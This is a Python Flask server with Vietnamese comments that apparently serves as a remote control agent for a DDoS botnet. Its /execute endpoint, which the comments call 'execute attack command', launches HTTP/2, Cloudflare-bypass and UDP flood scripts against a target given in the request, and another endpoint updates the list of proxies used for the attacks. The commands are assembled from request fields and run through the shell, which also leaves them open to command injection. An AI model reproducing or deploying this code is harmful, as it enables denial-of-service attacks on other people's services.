from flask import Flask, jsonify, request
import os
import subprocess
import time
import threading
import json
import logging

app = Flask(__name__)
running_tasks = {}  # Theo dõi các tác vụ đang chạy (task_id: process)

# Đường dẫn mặc định cho file proxy
PROXY_FILE = "proxy.txt"

@app.route('/status')
def status():
    """Trả về trạng thái của VPS hoặc task cụ thể."""
    task_id = request.args.get('task_id')
    if task_id:
        if task_id in running_tasks:
            process = running_tasks[task_id]
            if process.poll() is None:  # Đang chạy
                return jsonify({"status": "running"})
            else:
                return jsonify({"status": "completed", "output": "Task finished"})
        else:
            return jsonify({"status": "not_found"}), 404
    return jsonify({"status": "idle" if not running_tasks else "running"})

@app.route('/execute', methods=['POST'])
def execute():
    """Thực thi lệnh tấn công dựa trên dữ liệu nhận được."""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No data provided"}), 400

        script = data.get('script')
        target = data.get('target')
        time_ = int(data.get('time', 60))  # Mặc định 60 giây nếu không có

        # Xây dựng lệnh cmd tùy theo script
        if script == "UAM.js":
            rate = data.get('rate', '100')
            thread = data.get('thread', '8')
            cookiecount = data.get('cookiecount', '6')
            proxyfile = data.get('proxyfile', PROXY_FILE)
            cmd = f"node {script} {target} {time_} {rate} {thread} {cookiecount}"
        elif script == "udpbypass":
            port = data.get('port')
            if not port:
                return jsonify({"status": "error", "message": "Port required for UDPBypass"}), 400
            packet_size = data.get('packet_size', '1472')
            burst = data.get('burst', '1024')
            cmd = f"./{script} {target} {port} {time_} {packet_size} {burst}"
        elif script == "FloodH2.js":
            rate = data.get('rate', '64')
            thread = data.get('thread', '5')
            proxyfile = data.get('proxyfile', PROXY_FILE)
            cmd = f"node {script} {target} {time_} {rate} {thread} {proxyfile}"
        elif script == "cfhieu.js":
            rate = data.get('rate', '64')
            thread = data.get('thread', '5')
            proxyfile = data.get('proxyfile', PROXY_FILE)
            cmd = f"node {script} {target} {time_} {rate} {thread} {proxyfile}"
        else:
            return jsonify({"status": "error", "message": f"Unsupported script: {script}"}), 400

        # Kiểm tra file script tồn tại
        if not os.path.exists(script):
            return jsonify({"status": "error", "message": f"Script {script} not found"}), 404

        # Tạo task_id dựa trên thời gian
        task_id = str(time.time())
        running_tasks[task_id] = None

        # Chạy lệnh
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        running_tasks[task_id] = process

        # Theo dõi và dọn dẹp sau khi hoàn tất
        def cleanup(task_id, process):
            process.wait()
            output, error = process.communicate()
            if task_id in running_tasks:
                del running_tasks[task_id]
            if error:
                logging.error(f"Error in task {task_id}: {error.decode()}")
            logging.info(f"Task {task_id} completed with output: {output.decode()}")

        threading.Thread(target=cleanup, args=(task_id, process)).start()

        return jsonify({"status": "success", "task_id": task_id})

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/check_proxies')
def check_proxies():
    """Kiểm tra sự tồn tại của file proxy.txt."""
    if os.path.exists(PROXY_FILE):
        return jsonify({"status": "success", "message": "proxy.txt exists"}), 200
    else:
        return jsonify({"status": "error", "message": "proxy.txt not found"}), 404

@app.route('/update_proxies', methods=['POST'])
def update_proxies():
    """Cập nhật danh sách proxy vào file proxy.txt (xóa cũ và thêm mới)."""
    try:
        data = request.get_json()
        proxies = data.get('proxies', [])
        if not proxies:
            return jsonify({"status": "error", "message": "No proxies provided"}), 400

        with open(PROXY_FILE, 'w') as f:
            for proxy in proxies:
                f.write(f"{proxy.strip()}\n")
        return jsonify({"status": "success", "message": "Proxies updated"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    # Thiết lập logging cơ bản
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    # Chạy server trên port 5000
    app.run(host='0.0.0.0', port=5000)